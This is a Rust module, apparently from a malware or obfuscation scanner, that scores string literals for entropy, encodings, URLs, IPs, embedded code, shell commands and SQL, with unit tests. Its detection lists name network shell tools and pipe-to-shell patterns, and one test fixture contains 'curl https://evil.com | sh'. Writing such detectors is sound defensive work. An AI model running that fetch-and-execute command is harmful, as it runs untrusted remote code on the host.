//! String literal metrics analyzer
//!
//! Analyzes string literals for obfuscation and suspicious patterns.
//! Can work with AST-extracted strings or heuristic extraction.

use crate::types::StringMetrics;
use std::collections::HashMap;

/// Analyze a collection of string literals
#[must_use]
pub(crate) fn analyze_strings(strings: &[&str]) -> StringMetrics {
    let mut metrics = StringMetrics::default();

    if strings.is_empty() {
        return metrics;
    }

    // === Basic Counts ===
    metrics.total = strings.len() as u32;

    let mut total_bytes: u64 = 0;
    let mut max_length: u32 = 0;
    let mut empty_count: u32 = 0;
    let mut entropy_values: Vec<f32> = Vec::with_capacity(strings.len());

    // Encoding pattern counts
    let mut base64_count: u32 = 0;
    let mut hex_count: u32 = 0;
    let mut url_encoded_count: u32 = 0;
    let mut unicode_heavy_count: u32 = 0;

    // Content category counts
    let mut url_count: u32 = 0;
    let mut path_count: u32 = 0;
    let mut ip_count: u32 = 0;
    let mut email_count: u32 = 0;
    let mut domain_count: u32 = 0;

    // Suspicious pattern counts
    let mut very_long_count: u32 = 0;
    let mut embedded_code_count: u32 = 0;
    let mut shell_command_count: u32 = 0;
    let mut sql_count: u32 = 0;
    let mut high_entropy_count: u32 = 0;
    let mut very_high_entropy_count: u32 = 0;

    for s in strings {
        let len = s.len();
        total_bytes += len as u64;

        if len == 0 {
            empty_count += 1;
            continue;
        }

        if len > max_length as usize {
            max_length = len as u32;
        }

        // Entropy
        let entropy = calculate_string_entropy(s);
        entropy_values.push(entropy);

        if entropy > 5.0 {
            high_entropy_count += 1;
        }
        if entropy > 6.5 {
            very_high_entropy_count += 1;
        }

        // Encoding patterns
        if is_likely_base64(s) {
            base64_count += 1;
        }
        if is_hex_string(s) {
            hex_count += 1;
        }
        if has_url_encoding(s) {
            url_encoded_count += 1;
        }
        if has_unicode_heavy(s) {
            unicode_heavy_count += 1;
        }

        // Content categories
        if is_url(s) {
            url_count += 1;
        }
        if is_file_path(s) {
            path_count += 1;
        }
        if is_ip_address(s) {
            ip_count += 1;
        }
        if is_email(s) {
            email_count += 1;
        }
        if is_domain(s) {
            domain_count += 1;
        }

        // Suspicious patterns
        if len > 1000 {
            very_long_count += 1;
        }
        if has_embedded_code(s) {
            embedded_code_count += 1;
        }
        if has_shell_command(s) {
            shell_command_count += 1;
        }
        if has_sql_pattern(s) {
            sql_count += 1;
        }
    }

    metrics.total_bytes = total_bytes;
    metrics.avg_length = if metrics.total > 0 {
        total_bytes as f32 / metrics.total as f32
    } else {
        0.0
    };
    metrics.max_length = max_length;
    metrics.empty_count = empty_count;

    // Entropy statistics
    if !entropy_values.is_empty() {
        let sum: f32 = entropy_values.iter().sum();
        metrics.avg_entropy = sum / entropy_values.len() as f32;

        let mean = metrics.avg_entropy;
        let variance: f32 = entropy_values
            .iter()
            .map(|&e| {
                let diff = e - mean;
                diff * diff
            })
            .sum::<f32>()
            / entropy_values.len() as f32;
        metrics.entropy_stddev = variance.sqrt();
    }

    metrics.high_entropy_count = high_entropy_count;
    metrics.very_high_entropy_count = very_high_entropy_count;

    // Encoding patterns
    metrics.base64_candidates = base64_count;
    metrics.hex_strings = hex_count;
    metrics.url_encoded_strings = url_encoded_count;
    metrics.unicode_heavy_strings = unicode_heavy_count;

    // Content categories
    metrics.url_count = url_count;
    metrics.path_count = path_count;
    metrics.ip_count = ip_count;
    metrics.email_count = email_count;
    metrics.domain_count = domain_count;

    // Suspicious patterns
    metrics.very_long_strings = very_long_count;
    metrics.embedded_code_candidates = embedded_code_count;
    metrics.shell_command_strings = shell_command_count;
    metrics.sql_strings = sql_count;

    metrics
}

/// Calculate Shannon entropy of a string
fn calculate_string_entropy(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }

    let mut freq: HashMap<char, usize> = HashMap::new();
    let total = s.chars().count();

    for c in s.chars() {
        *freq.entry(c).or_insert(0) += 1;
    }

    freq.values()
        .map(|&count| {
            let p = count as f32 / total as f32;
            if p > 0.0 {
                -p * p.log2()
            } else {
                0.0
            }
        })
        .sum()
}

/// Check if string is likely base64-encoded
fn is_likely_base64(s: &str) -> bool {
    if s.len() < 16 || !s.len().is_multiple_of(4) {
        return false;
    }

    // Check for base64 character set
    let base64_chars = s
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '+' || *c == '/' || *c == '=')
        .count();

    if base64_chars != s.len() {
        return false;
    }

    // Should have mix of upper/lower
    let has_upper = s.chars().any(|c| c.is_ascii_uppercase());
    let has_lower = s.chars().any(|c| c.is_ascii_lowercase());

    // Padding at end
    let valid_padding = !s.contains('=') || s.ends_with('=') || s.ends_with("==");

    has_upper && has_lower && valid_padding
}

/// Check if string is pure hexadecimal
fn is_hex_string(s: &str) -> bool {
    if s.len() < 8 || !s.len().is_multiple_of(2) {
        return false;
    }

    // Allow optional 0x prefix
    let check = if s.starts_with("0x") || s.starts_with("0X") {
        &s[2..]
    } else {
        s
    };

    check.chars().all(|c| c.is_ascii_hexdigit())
}

/// Check for URL-encoding patterns (%XX)
fn has_url_encoding(s: &str) -> bool {
    let mut count = 0;
    let bytes = s.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        if bytes[i] == b'%'
            && i + 2 < len
            && bytes[i + 1].is_ascii_hexdigit()
            && bytes[i + 2].is_ascii_hexdigit()
        {
            count += 1;
            i += 3;
            continue;
        }
        i += 1;
    }

    // More than 3 URL-encoded characters
    count > 3
}

/// Check for heavy unicode escape usage
fn has_unicode_heavy(s: &str) -> bool {
    // Count \u, \x, &#x patterns
    let count = s.matches("\\u").count()
        + s.matches("\\x").count()
        + s.matches("&#x").count()
        + s.matches("&#").count();

    count >= 5
}

/// Check if string is a URL
fn is_url(s: &str) -> bool {
    let lower = s.to_lowercase();
    lower.starts_with("http://")
        || lower.starts_with("https://")
        || lower.starts_with("ftp://")
        || lower.starts_with("file://")
        || lower.starts_with("ws://")
        || lower.starts_with("wss://")
}

/// Check if string is a file path
fn is_file_path(s: &str) -> bool {
    // Unix paths
    if s.starts_with('/') && s.len() > 1 && !s.starts_with("//") {
        return s.chars().filter(|&c| c == '/').count() >= 1;
    }

    // Windows paths
    if s.len() >= 3 {
        let chars: Vec<char> = s.chars().take(3).collect();
        if chars.len() >= 3
            && chars[0].is_ascii_alphabetic()
            && chars[1] == ':'
            && (chars[2] == '\\' || chars[2] == '/')
        {
            return true;
        }
    }

    // Common path patterns
    s.starts_with("./")
        || s.starts_with("../")
        || s.starts_with("~")
        || s.contains("/bin/")
        || s.contains("/etc/")
        || s.contains("/tmp/")
        || s.contains("/var/")
        || s.contains("\\Windows\\")
        || s.contains("\\System32\\")
        || s.contains("\\AppData\\")
}

/// Check if string is an IP address
fn is_ip_address(s: &str) -> bool {
    // IPv4 simple check
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() == 4 {
        return parts.iter().all(|p| p.parse::<u8>().is_ok());
    }

    // IPv6 check (contains :: or multiple :)
    if s.contains(':') && !s.contains("://") {
        let colon_count = s.chars().filter(|&c| c == ':').count();
        if (2..=7).contains(&colon_count) {
            return s.chars().all(|c| c.is_ascii_hexdigit() || c == ':');
        }
    }

    false
}

/// Check if string is an email address
fn is_email(s: &str) -> bool {
    if !s.contains('@') || s.len() < 5 {
        return false;
    }

    let parts: Vec<&str> = s.split('@').collect();
    if parts.len() != 2 {
        return false;
    }

    let local = parts[0];
    let domain = parts[1];

    // Basic validation
    !local.is_empty()
        && !domain.is_empty()
        && domain.contains('.')
        && !domain.starts_with('.')
        && !domain.ends_with('.')
}

/// Check if string looks like a domain name
fn is_domain(s: &str) -> bool {
    // Skip URLs and paths
    if s.contains("://") || s.starts_with('/') || s.contains('\\') {
        return false;
    }

    // Skip emails
    if s.contains('@') {
        return false;
    }

    // Must have at least one dot
    if !s.contains('.') {
        return false;
    }

    // Common TLDs
    let tlds = [
        ".com", ".net", ".org", ".io", ".dev", ".co", ".xyz", ".ru", ".cn", ".de", ".uk", ".info",
        ".biz", ".cc", ".top", ".online", ".site", ".tk", ".ml", ".ga",
    ];

    let lower = s.to_lowercase();
    if tlds.iter().any(|tld| lower.ends_with(tld)) {
        // Basic domain character check
        return s
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-');
    }

    false
}

/// Check for embedded code patterns
fn has_embedded_code(s: &str) -> bool {
    let patterns = [
        "function(",
        "function ",
        "eval(",
        "exec(",
        "import ",
        "require(",
        "<script",
        "<?php",
        "def ",
        "class ",
        "System.",
        "Runtime.",
        "Process.",
    ];

    let lower = s.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

/// Check for shell command patterns
fn has_shell_command(s: &str) -> bool {
    let patterns = [
        "/bin/sh",
        "/bin/bash",
        "cmd.exe",
        "powershell",
        "curl ",
        "wget ",
        "chmod ",
        "chown ",
        "rm -",
        "dd if=",
        "nc -",
        "netcat",
        "python -c",
        "perl -e",
        "ruby -e",
        "nohup ",
        "| sh",
        "| bash",
        "2>&1",
        ">/dev/null",
        "$(", // Command substitution
        "`",  // Backtick substitution
    ];

    let lower = s.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

/// Check for SQL patterns
fn has_sql_pattern(s: &str) -> bool {
    let patterns = [
        "SELECT ", "INSERT ", "UPDATE ", "DELETE ", "DROP ", "CREATE ", "ALTER ", "UNION ",
        " FROM ", " WHERE ", " AND ", " OR ", "--", "';", "1=1", "1 = 1",
    ];

    let upper = s.to_uppercase();
    patterns.iter().filter(|p| upper.contains(*p)).count() >= 2
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_empty_strings() {
        let metrics = analyze_strings(&[]);
        assert_eq!(metrics.total, 0);
    }

    #[test]
    fn test_basic_strings() {
        let strings = vec!["hello", "world", "test"];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.total, 3);
        assert!(metrics.avg_length > 0.0);
    }

    #[test]
    fn test_base64_detection() {
        let strings = vec!["SGVsbG8gV29ybGQh", "normalString"];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.base64_candidates, 1);
    }

    #[test]
    fn test_hex_detection() {
        let strings = vec!["deadbeefcafebabe", "0x414243", "normal"];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.hex_strings, 2);
    }

    #[test]
    fn test_url_detection() {
        let strings = vec!["https://example.com", "ftp://server/file", "normal"];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.url_count, 2);
    }

    #[test]
    fn test_ip_detection() {
        let strings = vec!["192.168.1.1", "10.0.0.1", "not.an.ip.really"];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.ip_count, 2);
    }

    #[test]
    fn test_shell_command_detection() {
        let strings = vec![
            "/bin/bash -c 'echo test'",
            "curl https://evil.com | sh",
            "normal",
        ];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.shell_command_strings, 2);
    }

    #[test]
    fn test_sql_detection() {
        let strings = vec!["SELECT * FROM users WHERE id=1", "normal string"];
        let metrics = analyze_strings(&strings);
        assert_eq!(metrics.sql_strings, 1);
    }

    #[test]
    fn test_entropy_calculation() {
        let strings = vec!["aaaaaaaaaa", "abcdefghij"];
        let metrics = analyze_strings(&strings);
        // First string should have low entropy, second higher
        assert!(metrics.avg_entropy > 0.0);
    }
}
